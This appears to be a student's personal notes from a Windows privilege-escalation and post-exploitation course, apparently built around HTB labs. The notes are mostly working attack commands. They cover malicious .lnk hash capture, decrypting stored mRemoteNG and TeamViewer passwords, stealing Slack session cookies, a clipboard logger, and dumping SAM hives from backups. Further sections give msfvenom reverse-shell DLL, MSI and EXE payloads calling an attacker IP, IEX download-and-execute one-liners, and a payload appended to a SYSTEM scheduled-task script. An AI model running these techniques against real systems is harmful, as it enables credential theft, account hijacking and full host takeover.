echo 'Administrator::WINLPE-SRV01:815c...:afb6...:0101...' > hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
→ `-m 5600` = NetNTLMv2 → gives the cleartext password (e.g. `Welcome1`).

### Server 2019? SCF is dead → use a malicious `.lnk` instead

Same effect, made with PowerShell:

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to this folder triggers an auth request."
$lnk.Save()
```
Drop the `.lnk` in the share → Responder catches the hash the same way. 

#### **Easier way — the Lnkbomb tool** (generates + drops the `.lnk` for you):

**Lnkbomb runs from your ATTACK BOX.** It’s a Python tool that connects over SMB and **drops the `.lnk` onto the target’s share remotely** — you point it at the target:

```bash
python3 lnkbomb.py -a <attacker_ip> -t \\target\share -g     # -g = generate/drop
```

> **SCF vs .lnk:** SCF = older Windows. `.lnk` = works on **Server 2019** (and generally newer). Both do the same thing: icon on a UNC path → user browses → hash leaked.


---
---

# Section 26 - Pillaging

## 1. What Is Pillaging?

**Pillaging** means collecting useful information from a compromised Windows host after gaining access. This can include passwords, credentials, configuration files, chats, clipboard contents, backups, and other information that may help with lateral movement, privilege escalation, or the engagement goal.

**Where to look:** Installed applications, services (web/DB/file shares/backups), browsers, IM clients (Slack/Teams), clipboard, keylogging-related data, and documents.

---

## 2. Enumerate Installed Applications

Start by identifying installed applications that may store credentials or provide access to other systems.

### List Program Directories

```
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

### Get Application Names, Versions, and Paths

Run in PowerShell:

```powershell
$apps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, InstallLocation

$apps += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, InstallLocation

$apps | ?{ $_.DisplayName } | sort DisplayName -Unique | ft -AutoSize
```

Look for remote-access and credential-storing applications, such as **mRemoteNG, TeamViewer, OpenVPN, WinSCP, and PuTTY**.

---

## 3. Loot Credential-Storing Applications

### 3.1 mRemoteNG

**What it is:** A remote-connection manager that stores connection details and encrypted passwords in `confCons.xml`. If the user has not configured a custom master password, mRemoteNG uses the hardcoded master password `mR3m`.

#### Find the Configuration File

``` PowerShell 
ls C:\Users\<user>\AppData\Roaming\mRemoteNG

type C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml
```

Copy the `Password="..."` value from a `<Node>` element.

#### Decrypt the Saved Password

Use [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) on the attack box. Default master password:

``` bash
python3 mremoteng_decrypt.py -s "<Password_value>"
```

Known custom master password:

```bash
python3 mremoteng_decrypt.py -s "<Password_value>" -p admin
```

#### Determine Whether a Custom Master Password Is Set

You cannot reliably tell by looking at the configuration alone. Test the default password first. The `<Connections>` root tag has a `Protected="..."` attribute. With the correct master password, this value should decrypt to the exact string `ThisIsProtected`.

```bash
python3 mremoteng_decrypt.py -s "<Protected_value_from_Connections_tag>"
```

|Result|Meaning|
|---|---|
|Prints `ThisIsProtected`|The default password (`mR3m`) works. Decrypt the node passwords normally.|
|Prints garbage or an error|A custom master password may be set. Test or crack it if appropriate.|

#### Crack the Master Password If Unknown

```bash
for p in $(cat /usr/share/wordlists/fasttrack.txt); do echo $p; python3 mremoteng_decrypt.py -s "<Password_value>" -p $p 2>/dev/null; done
```

You can test either the `Protected` attribute or a node's `Password` value.

- Cracking `Protected` prints `Password: ThisIsProtected` when the master password is correct.
    
- Cracking a node's `Password` prints the actual saved password.


### 3.2 Other Credential-Storing Applications

| Application                                | Command or method                                                                                                                                                   |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **WinSCP** — saved sessions/passwords      | `reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s` then investigate with `winscppasswd.py` or Metasploit's `enum_winscp` module.                       |
| **PuTTY** — proxy credentials and sessions | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s` and look for `ProxyPassword`.                                                                             |
| **TeamViewer** — stored password           | `reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v SecurityPasswordAES` then investigate the value offline. The original method describes a known static AES key. |
| **FileZilla**                              | `type "%APPDATA%\FileZilla\recentservers.xml"` and `type "%APPDATA%\FileZilla\sitemanager.xml"`. Passwords may be Base64-encoded.                                   |
| **OpenVPN**                                | Inspect `.ovpn` configuration files for `auth-user-pass` and credentials stored inline.                                                                             |

You can also use LaZagne to search for saved credentials:

```
lazagne.exe all
```

LaZagne can extract credentials from many applications automatically. See your credential-hunting notes for more details.

---

## 4. Investigate Slack/Teams Session Cookies

If credentials are unavailable or MFA is enabled, an existing session cookie may provide access to an authenticated session. Slack's authentication cookie is named `d`. Session cookies are sensitive authentication tokens. Handle them only within an authorized lab or assessment.

### 4.1 Firefox

Firefox stores cookies in `cookies.sqlite`. Firefox cookie values generally do not require the same DPAPI decryption used by Chrome.

#### Copy the Cookie Database

```PowerShell

copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

#### Option A — Search on the Target

Slack's `d` cookie commonly starts with `xoxd-`.

```PowerShell

Select-String -Path cookies.sqlite -Pattern "xoxd-[A-Za-z0-9%/+=]+" -Encoding ascii | % { $_.Matches.Value }
```

#### Option B — Extract on the Attack Box

Using SQLite directly avoids output truncation:

```bash
sqlite3 cookies.sqlite "SELECT value FROM moz_cookies WHERE name='d';"

sqlite3 cookies.sqlite "SELECT name,value,host FROM moz_cookies WHERE host LIKE '%slack%';"
```

Alternatively, use the module's script:

```bash
python3 cookieextractor.py --dbpath "cookies.sqlite" --host slack --cookie d
```

**Troubleshooting:**

- `**win32crypt**` **/** `**pypiwin32**` **errors:** Some cookie scripts depend on Windows-only modules and will not work on Linux. `pip install pypiwin32` may fail with `metadata-generation-failed`. This applies to certain Chrome-cookie scripts; Firefox generally does not need that dependency.

- **Base64 padding:** Include `=` in the search pattern (`[A-Za-z0-9%/+=]`) so trailing padding is not lost. SQLite returns the exact stored value.


### 4.2 Chrome/Chromium

Chrome cookies use Windows DPAPI and related encryption mechanisms. The original method uses SharpChromium and must run in the appropriate user's context.

```PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

Newer Chrome versions may store cookies in the `Network` subdirectory. The original workflow copies the database to the location expected by the tool:

```PowerShell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

Invoke-SharpChromium -Command "cookies slack.com"
```

### 4.3 Use the Cookie in the HTB Lab

The original lab workflow uses the Cookie-Editor browser extension to set the `d` cookie on the target site. Set the below and refresh the browser to make your cookie work.

|Field|Required value|
|---|---|
|**Name**|Exactly `d`|
|**Value**|The complete value on one line. If it ends in `==`, do not truncate it.|
|**Domain**|The actual site being accessed, such as `slacktestapp.com` in the HTB lab, not necessarily `slack.com`.|
|**Path**|`/`|

---

## 5. Clipboard — Catch Copy-Pasted Passwords

Administrators may copy and paste passwords from password managers. A keylogger may miss this, but clipboard monitoring can capture copied content.

Download and run the clipboard script in the authorized lab:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

Invoke-ClipboardLogger
```

Wait for the user to copy something. The script may display copied content such as URLs, passwords, or 2FA tokens.

---

## 6. Investigate Backup Servers

A **backup server** is a machine or service that makes copies of other computers' files and stores them. Backup systems are worth investigating for two main reasons:

1. Backup service accounts may have administrative access to many machines because they need to read files for backup operations.

2. Backups may contain sensitive data, including password hashes (`SAM`/`SYSTEM`), SSH keys, and configuration files containing passwords.


If you have authorized access to a backup system, its existing backups may let you recover files that are not normally readable from the live system.

### 6.1 General Method for Any Backup System

Restic is only one example. The same investigation applies to Veeam, Acronis, Bacula, Windows Server Backup, restic, and Cobian, although the commands differ.

1. **Identify the tool.** Check installed applications and services using commands such as `dir "C:\Program Files"`.

2. **Find stored credentials.** Backup configurations may contain service-account credentials. Those accounts may have administrative access to multiple machines. Check relevant configuration files and registry entries.

3. **Find existing backups.** Look for repository/storage directories named `backups` or `snapshots`, or files with extensions such as `.vbk` and `.tib`.

4. **Restore a backup.** Recover the files you are authorized to examine such as SAM/SYSTEM hives, SSH keys, and configuration files with passwords.

5. **Research the tool.** Search for its restore syntax and credential-storage locations, for example, `"restore backup <tool> command line"` and `"<tool> stored credentials"`.



### 6.2 Restic — Understand Backup and Restore

Two terms are important:

- backup = restic copies files INTO its storage (the "repo"). Because restic runs with high privileges, it can copy files you can't open yourself.
- restore = restic takes files OUT of the repo and drops them in a normal folder you can read.

So why "back up" if I just want to read? Because a file you can't open (e.g. the registry/SAM) → you make restic back it up (restic reads it with its powers) → then restore it to a folder you can read. backup = grab it, restore = read it.


#### Option A — Existing Backups Already Exist

This is the common case. Do not create new backups if the information you need is already stored in an existing repository. List snapshots and restore the one you need:

```PowerShell

# Find the repository folder:
Get-ChildItem C:\ -Recurse -Directory -Filter snapshots -EA Ignore

# Or Check every drive, not just C: — repos are often on D:, E:, or a USB/backup drive:

foreach ($d in (Get-PSDrive -PSProvider FileSystem).Root) { Get-ChildItem $d -Recurse -Directory -Filter snapshots -EA Ignore | Select FullName }

# List available snapshots
restic.exe -r <existing_repo> snapshots

# Restore the selected snapshot, mkdir the Restore directory.
restic.exe -r <existing_repo> restore <ID> --target C:\Restore
```

The restored files appear under `C:\Restore`. You can then inspect files such as SAM/SYSTEM hives, SSH keys, or configuration files.

#### Option B — Back Up a File You Cannot Read

The original lab example creates a repository, sets its password, backs up the target files, and restores them to a readable directory.

```PowerShell 
# 1. Create a repository folder and initialize it
mkdir E:\restic2; restic.exe -r E:\restic2 init

# 2. Set the repository password so restic stops prompting
$env:RESTIC_PASSWORD = 'Password'

# 3. Back up the files; use a filesystem snapshot for locked files
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# 4. List snapshots and restore the required one
restic.exe -r E:\restic2\ snapshots
restic.exe -r E:\restic2\ restore <ID> --target C:\Restore
```

The restored files may appear under:

```
C:\Restore\C\Windows\System32\config
```

**Important notes:**

- `--use-fs-snapshot` asks restic to use a filesystem snapshot so it can read files that Windows has locked or that are in use. Without a suitable snapshot, files may fail with `Access is denied`.

- If `RESTIC_PASSWORD` is not set for an existing repository, you need the correct repository password to open it.    

---

### 6.3 Restic — Full Lab Walkthrough

#### Step 1 — Open the Repository: Path vs. ID

The repository is the parent directory of the `snapshots` folder. The `AppData\Local\restic` directory is only the cache; do not mistake it for the repository.  After finding the repository path, open it. 

The `-r` option requires the **repository folder path**, not the repository ID.

```powershell
restic.exe -r E:\restic snapshots
```

This works because `E:\restic` is the folder containing the repository's configuration and data.

Example output:

```
repository 2e40703c opened successfully
```

Here, `2e40703c` is the repository ID, **not** the folder path. Set the password once:

```PowerShell
$env:RESTIC_PASSWORD='<pass>'
```


#### Step 2 — Restore All Snapshots to you designated folder where you can read them


```Powershell
#set the pass once instead of providing everytime
$env:RESTIC_PASSWORD='<pass>'

# save all sanpshots

foreach ($id in (restic.exe -r E:\restic snapshots --json | ConvertFrom-Json).short_id) { restic.exe -r E:\restic restore $id --target "C:\Restore\$id"}
```

#### Step 3: Search the Files


```PowerShell

# 1) Hives + credential files (find by name — clean):

Get-ChildItem C:\Restore -Recurse -Include SAM,SYSTEM,SECURITY,SOFTWARE,*.kdbx,id_rsa,*.ppk,*.pfx -EA Ignore | Select-Object FullName

# 2) Scripts/configs (grep INSIDE for passwords):

Get-ChildItem C:\Restore -Recurse -Include *.config,*.php,*.ps1,*.xml,*.ini,*.txt -EA Ignore |
  Select-String "password","pwd","secret","connectionstring","db_pass","user","username","uid","login" |
  Where-Object { $_ -notmatch 'http|schema|xmlns' }
```

Example results from `web.config` database connection strings contained these passwords:

- **Administrator:** `NewSuperPa$$w0rd!`
- **jeff:** `Webmaster001!`

Example paths:

```PowerShell
C:\Restore\<id>\C\Windows\System32\config\SAM
C:\Restore\<id>\C\Windows\System32\config\SYSTEM
```

Copy the files to Kali 

```powershell
copy C:\Restore\<id>\C\Windows\System32\config\SAM \\10.10.14.66\share\
```

and extract the hashes:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```


**Important: a configuration snapshot may not contain SAM/SYSTEM.**

The four registry hives `SAM`, `SYSTEM`, `SECURITY`, and `SOFTWARE` may be locked while Windows is running. If a backup was taken without Volume Shadow Copy Service (VSS) support, those files may have been skipped. You might see `COMPONENTS`, `DRIVERS`, or `ELAM` while the `S` section is missing. If `restic find` cannot find `SAM` or `SYSTEM` in one snapshot, check other configuration snapshots. A snapshot taken using a filesystem shadow copy may contain them. Also check:

```powershell

Get-ChildItem C:\Restore -Recurse -Directory -Filter RegBack -EA Ignore | ForEach-Object { Get-ChildItem $_.FullName | Select-Object FullName, Length }
```

for backup copies, if available.

**Which files to keep or skip:**

- **Keep:** Plain `SAM`, `SYSTEM`, `SECURITY`, and `SOFTWARE` files without extensions.
- **Skip:** Files ending in `.LOG`, `.blf`, `.regtrans-ms`, or `{GUID}` names when looking specifically for the primary hive files. These are generally transaction logs or related files, not the main hives.

---
---

# Section 27 - Miscellaneous Windows Privesc Techniques 

A grab-bag of extra privesc tricks for when the main ones are exhausted: living-off-the-land binaries, AlwaysInstallElevated, a GUI UAC bug, scheduled tasks, description-field creds, and stealing hashes from backup virtual disks.


## 1. LOLBAS — Living Off The Land Binaries

**What:** Microsoft-signed binaries already on Windows (or downloadable from MS) that have hidden useful functions — file transfer, code execution, UAC bypass, cred theft, DLL hijacking. Because they're **signed and built-in**, AV trusts them, so great for **evasion**.

Project (browse it): https://lolbas-project.github.io

### certutil — transfer files + base64 encode/decode

```cmd

# download a file
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat   
# base64 encode
certutil -encode file1 encodedfile

# base64 decode    
certutil -decode encodedfile file2                                            
```

Note: `certutil` is **heavily AV-flagged** now (known download trick). Use a quieter built-in instead:

| Binary | Download command | Works on |
|--------|------------------|----------|
| certutil | `certutil -urlcache -split -f <URL> out` | all (but AV-flagged) |
| bitsadmin | `bitsadmin /transfer j <URL> C:\Windows\Temp\out` | all |
| curl.exe | `curl <URL> -o out` | Win10 1803+ (built-in) |
| powershell | `iwr <URL> -o out` | PS v3+ (use WebClient on old PS) |
| SMB copy | `copy \\<IP>\share\tool.exe .` | all (no HTTP needed) |

### rundll32 — execute a DLL (reverse shell)

rundll32.exe is always on the box (nothing to find). It’s an evasion/execution trick — you use it to run your reverse-shell DLL through a Microsoft-signed binary so AV/AppLocker trusts it. You discover which built-ins to use from the LOLBAS website, not by scanning the target.

`rundll32.exe` can run a malicious DLL. Make one, host it (SMB/HTTP), run it:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=9443 -f dll -o evil.dll
```

```cmd
rundll32 \\10.10.14.3\share\evil.dll,Start
```

---

## 2. AlwaysInstallElevated — any .msi runs as SYSTEM

**What:** if this policy is on, **any MSI installs with SYSTEM privileges** → easy SYSTEM. Both the HKCU and HKLM keys must be `0x1`.

**Check (both must say 0x1):**

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit A — msfvenom reverse shell MSI:**

```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

Transfer it.  start `nc -lnvp 9443` first → catch a SYSTEM shell.

```cmd
msiexec /i C:\Users\Public\aie.msi /quiet /qn /norestart
```



**Exploit B (shortcut) — PowerUp makes an admin-adding MSI (no msfvenom):**

```powershell
Import-Module .\PowerUp.ps1

Write-UserAddMSI
```

→ creates `UserAdd.msi`; run it to add an admin user.


Shortcut: **WinPEAS / PowerUp flag this automatically** — you rarely find it by hand.

---

## 3. CVE-2019-1388 — UAC certificate dialog → SYSTEM (GUI only)

The bug lives in **Windows' UAC certificate dialog itself**, not in any one program or service — any Microsoft-signed exe whose certificate carries the special clickable "Issued by" link can trigger it, and `hhupd.exe` is simply the handy, reliable one you bring with you. It affects a **wide range of Windows and Server versions** (7 / 8.1 / 10 and Server 2008–2019); the only thing that matters is whether the box installed the **November 2019 patch** — unpatched since then = vulnerable, no matter the OS year.

**What:** run signed `hhupd.exe` → open its certificate → the cert has a **clickable link** that opens a **browser as SYSTEM**. From that browser's **Save As** window you launch `cmd.exe`, which inherits SYSTEM.

**Conditions:** needs **GUI/RDP** (it's all clicking) and an **unpatched** box (fixed Nov 2019).

**Is this box vulnerable? (it's a patch check, not a service)**  There's no service to find — you confirm it by the **patch level**:

```
systeminfo                              
# OS build + Hotfix(s) list

wmic qfe list brief /format:table      
#installed patches + dates
```

```
Get-HotFix | sort InstalledOn -Descending | select -First 5
```

If nothing is installed after **Nov 2019**, it's very likely vulnerable. Or feed `systeminfo` to **WES-NG** (Windows Exploit Suggester), which flags CVE-2019-1388 directly — save `systeminfo > systeminfo.txt` on the target, copy it to your attack box, then:

```
wes.py --update && wes.py systeminfo.txt        
# all missing patches

wes.py systeminfo.txt | grep -i 1388            
# jump straight to this CVE
```


Quickest real test: just run `hhupd.exe` — if the cert's "Issued by" link is clickable and opens a SYSTEM browser, you're in.

| # | Step |
|---|------|
| 1 | Right-click `hhupd.exe` → **Run as administrator** |
| 2 | Click **"Show information about the publisher's certificate"** |
| 3 | On the **General** tab, click the **Issued by** hyperlink → OK → a browser opens (as SYSTEM) |
| 4 | Right-click page → **View page source** → in the new tab right-click → **Save as** |
| 5 | In the Save dialog's path box type `c:\windows\system32\cmd.exe` → Enter → **cmd as SYSTEM** |

Confirm: `whoami` → `nt authority\system`.

---

## 4. Scheduled Tasks — writable script run as admin


**Idea:** a task that runs as SYSTEM/admin executes a script. If you can write to that script, your code runs as SYSTEM.

**Step 1 — List the tasks:** (shows **your own tasks + the built-in default Windows tasks**)

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName,State
```

**Step 2 — Pick a target task.** In the `schtasks` output, read two lines per task:

- **Run As User** → you want `SYSTEM` or an admin.
- **Task To Run** → the script it runs (e.g. `C:\Scripts\db-backup.ps1`). Note this path.

**Step 3 — Can you write to that script?** Pick one way:

Option A — accesschk:

```
accesschk.exe /accepteula -s -d C:\Scripts\     
# "RW BUILTIN\Users" = yes, writable
```

Option B — PowerShell (no tool):

```powershell
try { $s=[IO.File]::OpenWrite("C:\Scripts\db-backup.ps1"); $s.Close(); "writable" } catch { "no" }
```

Option C (shortcut) — let PowerUp/WinPEAS find writable task scripts for you:

```powershell
Import-Module .\PowerUp.ps1; Invoke-AllCheckswinpeas.exe
```

**Step 4 — Writable? Append your payload:**

```powershell
Add-Content C:\Scripts\db-backup.ps1 "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3/rev.ps1')"
```

**Step 5 — Wait for the task to run** → shell with its privileges (often SYSTEM). Not instant — plant it and check back.

Note: you often **can't see other users' tasks** (stored in `C:\Windows\System32\Tasks`, no read access). Work around it:

- **Find ANY writable script/folder**, then plant+wait:

```
accesschk.exe /accepteula -uwdqs Users C:\  
    
# folders the Users group can write to

accesschk.exe /accepteula -uwqs Users C:\*.*  
  
# files Users can write to
```

Also try `"Authenticated Users"` and `Everyone` in place of `Users` — your account may be in those groups instead.

- **No accesschk?** write-test every script with PowerShell:

```powershell
Get-ChildItem C:\ -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs -EA Ignore | ForEach-Object { try { $s=[IO.File]::OpenWrite($_.FullName); $s.Close(); $_.FullName } catch {} }
```

- **Read any task XML you CAN open** — shows what it runs + sometimes creds:

```
type C:\Windows\System32\Tasks\<TaskName>
```

- **Catch a task firing live** (see which script runs, and as who) — snapshot processes in a loop:

```powershell
while($true){ Get-WmiObject Win32_Process | select Name,CommandLine; Start-Sleep 1 }
```

Caught a script running as SYSTEM? If that script/file is writable by you, append your payload → next run = reverse shell. You don’t write to the _task_ itself, you write to the **script/file the task runs** (the path the loop reveals)

---

## 5. Account Description field — stored passwords

Admins sometimes stash a password in a user's or computer's description.

```powershell

# read the Description column
Get-LocalUser      

# computer description
Get-WmiObject -Class Win32_OperatingSystem | select Description   
```

In a domain:

```powershell
Get-ADUser -Filter * -Properties Description | select SamAccountName,Description
```

---

## 6. Mount a VHDX/VMDK backup → steal hashes

A backup **virtual disk** of a live machine lets you reach its `C:\Windows\System32\config` → pull `SAM` + `SECURITY` + `SYSTEM` → dump local hashes offline. Great when you couldn't privesc on the live host but found its disk image on a share.

**Remember: mount = READ the disk (like plugging in a USB), NOT copy it.** After mounting you just grab the 3 small hive files.

### **Step 1 — Find the disk** (usually on a **backups file share**).

Local disk:

```powershell

Get-ChildItem C:\,D:\,E:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -EA Ignore | Select-Object FullName, Length
```

Network shares (list shares, then spider their files):

```bash
nxc smb <ip> -u user -p pass --shares                 
# see what shares exist

nxc smb <ip> -u user -p pass -M spider_plus            
# crawl their files

manspider <subnet> -u user -p pass -e vhd vhdx vmdk    
# search shares by extension
```

Domain-joined Windows box — Snaffler auto-flags virtual disks (+ creds/keys/configs):

```cmd
Snaffler.exe -s -o snaffler.log -d <domain> -n <dc>
```

### **Step 2 — Mount it.** Pick where:

Option A: on your **Linux attack box** (best — lets you dump with no transfer):

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk              # VMDK
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1   # VHD/VHDX
```

Option B — on **Windows** (VHD/VHDX only — not VMDK):

```powershell
Mount-VHD -Path C:\backups\WEBSRV10.vhdx -ReadOnly   
# just attaches the disk — it doesn’t tell you the letter, needs the Hyper-V PowerShell module
Get-Volume                                           
# showcase the new drive letter (e.g. F:)
# read F:\Windows\System32\config\ ... 
#when done: 
Dismount-VHD -Path C:\backups\WEBSRV10.vhdx
```


on **Windows**: right-click the file → **Mount**, or `Mount-VHD -Path x.vhdx`, or extract with **7-Zip**. It appears as a new drive letter (e.g. `F:\`). Go to `F:\Windows\System32\config\` → copy out `SAM`, `SYSTEM`, `SECURITY`.



### **Step 3 — Dump the hashes** — two paths depending on where you mounted:

Option A: mounted on **Linux** → point secretsdump straight at the mounted files (no copy, no transfer):

```bash
secretsdump.py -sam /mnt/vmdk/Windows/System32/config/SAM -security /mnt/vmdk/Windows/System32/config/SECURITY -system /mnt/vmdk/Windows/System32/config/SYSTEM LOCAL
```

Option B: mounted on **Windows** → copy the 3 hives off the drive, transfer to your attack box (SMB), then:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

→ local user NTLM hashes (often the local admin — try them on other machines too, password reuse).

Note: grab **SECURITY** too, not just SAM+SYSTEM — it holds **cached domain creds / LSA secrets** = extra loot.







---
---


# Section 29 - Windows Server

WMI only shows what’s INSTALLED. KB's are like ID's.

```powershell

wmic qfe list brief /format:table # cmd

Get-HotFix | sort InstalledOn -Descending     # same data, PowerShell
```


To find MISSING KBs — two real ways:

1. Ask Windows Update directly (WUA COM — this truly checks “missing”):

```powershell

$s = (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher()
$s.Search("IsInstalled=0").Updates | ForEach-Object { $_.Title }
```

This asks the update agent “what updates do I NOT have?” — it checks against the configured update source (Microsoft Update or the company’s WSUS). Caveat: needs network to the update server, and if WSUS limits what’s offered, you only see those.

2. Offline compare (best for pentest — no network needed): take the installed list + OS build and compare against Microsoft’s database with a tool:

```
systeminfo > systeminfo.txt

wes.py systeminfo.txt    # WES-NG lists missing patches + the CVEs they fix
```

(Watson / Sherlock do the same on-box.) Bypass policy with `Set-ExecutionPolicy bypass -Scope process`, search for vulnerabilities with `Sherlock.ps1` and then exploit with metasploit.

---
# Metasploit Local Privesc 

Goal: break in as a weak user, then use a second exploit to level up to SYSTEM. 
## The simple idea

First get **any way in** (a weak user shell). Then use a **local exploit** to level up to admin/SYSTEM. A **session** = "I'm already inside this machine." Metasploit numbers them (1, 2…); `sessions -i 1` jumps in, `background` steps back out (it keeps running).

Two kinds of exploits:
- **Remote** = breaks in from outside → you give it the target's **IP**.
- **Local (privesc)** = runs inside a shell you already have → you give it a **SESSION number**, not an IP.

## Step 1 — Find what the box is vulnerable to

On the target (I already had RDP):

```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```

It lists each bug with a VulnStatus (e.g. "Appears Vulnerable"). `local_exploit_suggester` (in msf) or WinPEAS/Watson do the same.

## Step 2 — Local exploits need a SESSION first

When I tried to use a privesc module straight away, its options showed `SESSION ... yes (required)` — no IP. That's the lesson: a local exploit runs **inside a shell you already have**, so I had to **get a shell first**.

## Step 3 — Get the first shell (smb_delivery)

```
use exploit/windows/smb/smb_delivery
set SRVHOST 10.10.14.66
set LHOST 10.10.14.66
set target 0
run
```

Then run the one-liner it prints on the target. The shell comes back = **session 1**. (Ignore the `[SMB] NTLMv2` hash lines — that's just scanner noise.)

Problems I hit here:

- **`EACCES: Permission denied bind 0.0.0.0:445`** → port 445 is a privileged port (under 1024) and needs root → run **`sudo msfconsole`**.
- **One-liner showed `\\0.0.0.0\...`** → I'd set LHOST but not SRVHOST. The UNC path comes from **SRVHOST** (LHOST is only the shell callback) → `set SRVHOST 10.10.14.66`.
- **Ports stuck (`BindFailed` on 445/4444)** → `jobs -K` kills msf's own servers. Still stuck = clean slate: `exit` msf → `sudo pkill -9 -f ruby` → `sudo fuser -k 445/tcp 4444/tcp` → confirm empty with `sudo ss -ltnp | grep -E ':445|:4444'` → start one fresh msfconsole.

## Step 4 — Prep the session

```
sessions -i 1     (go into it)
getpid            (which process my shell is in)
ps                (list processes — read the Arch column)
```

My initial shell was **32-bit (x86)**, but I needed a 64-bit (x64) shell for the **exploit** I wanted to try. A 64-bit Windows machine can run both 32-bit and 64-bit programs. So i had to migrate to 64 bit. Pick a process that is: **x64 + owned by my user + stable** (has 2nd, 3rd sessions). explorer.exe is best; powershell.exe / conhost.exe are fine too. 

```
migrate <pid>
```

Then:

```
background
```

## Step 5 — Run the local privesc exploit

```
use <the module>
set SESSION 1
set LHOST 10.10.14.66
set LPORT 5555        (a fresh, free port)
run
```

- My first exploit reported that the target was not vulnerable, so I tried another candidate from the enumeration results **MS16-032 . I selected an x64 option because my session had been migrated to a 64-bit process. Although i got system here, but got no shell... Then tried another vulnerability, it was not exploitable.
- Finding no option i again came back to Task scheduler vuln. **Task scheduler (MS10-092) first said "not vulnerable"** → I set **`set ForceExploit true`** to run it anyway → it worked and gave me SYSTEM. (Use ForceExploit when the check is wrong but you believe it's vulnerable.)

## Step 6 — "Got SYSTEM but no session" (fix the callback)

The exploit runs my payload as a **brand-new SYSTEM process** that has to **call back to me**. If **AV kills it** (old box, likely Defender) or a **firewall blocks the port**, I get "Executed on target… but no session." Fixes:
- `jobs -K` before each run (a stale handler = silent fail).
- Use a **free port** → check `sudo ss -ltnp | grep :5555` (empty = good).
- Try a **plain shell payload** — lighter, beats AV: `set PAYLOAD windows/x64/shell_reverse_tcp`.
- `set ForceExploit true` if the module wrongly says not vulnerable.
- OR ELSE JUST DOWNLOAD THE EXPLOIT AND RUN ON TARGET.


## Quick answers (things that confused me)

- **Was the target 32-bit?** No — the machine is 64-bit (it runs x64 programs). Only *my shell* was 32-bit; I moved my shell to match, not the machine.
- **conhost.exe?** Just the normal Windows program behind console windows. I migrated into it because it was x64 + owned by my user + steady (the 3 things a migrate target needs).
- **If I pick a 32-bit payload, do I re-migrate?** No. The **payload is a separate new program** — a 32-bit payload runs fine from an x64 session (64-bit Windows runs 32-bit programs). Only the **target** (x86/x64) must match my session's arch, and that's already x64.

## Port "BindFailed / address already in use" (445 or 4444)

A port is held by an old job/process. First in msf: `jobs -K`, then `run` once. Still stuck? From a bash tab: `sudo fuser -k 445/tcp 4444/tcp` + `sudo pkill -9 -f ruby` + `sudo systemctl stop smbd nmbd`, check free with `sudo ss -ltnp | grep -E ':445|:4444'` (empty = good), then restart msfconsole.

---
---

# Section 30 - Windows Desktop Versions

## Windows Exploit Suggester

|Command|Description|
|---|---|
|`sudo python2.7 windows-exploit-suggester.py --update`|Update the Windows Exploit Suggester vulnerability database.|
|`python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt`|Compare the target's `systeminfo` output against the exploit database to identify possible vulnerabilities.|



##  Meterpreter / Payload Generation

|Command|Description|
|---|---|
|`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`|Generate a Windows Meterpreter reverse HTTPS executable.|
|`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`|Generate a Windows reverse-shell MSI package.|
|`msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`|Execute an MSI package from the command line.|
|`get-process -Id 3324`|Enumerate a process by PID with PowerShell.|



**reverse_https .exe** = full Meterpreter shell, over encrypted HTTPS, as a normal program → powerful + stealthy (sneaks past firewalls).

**reverse_shell .msi** = plain cmd shell, over raw TCP, as an installer package → simple, and the MSI format lets you abuse installer tricks like AlwaysInstallElevated (MSI runs as SYSTEM).

---

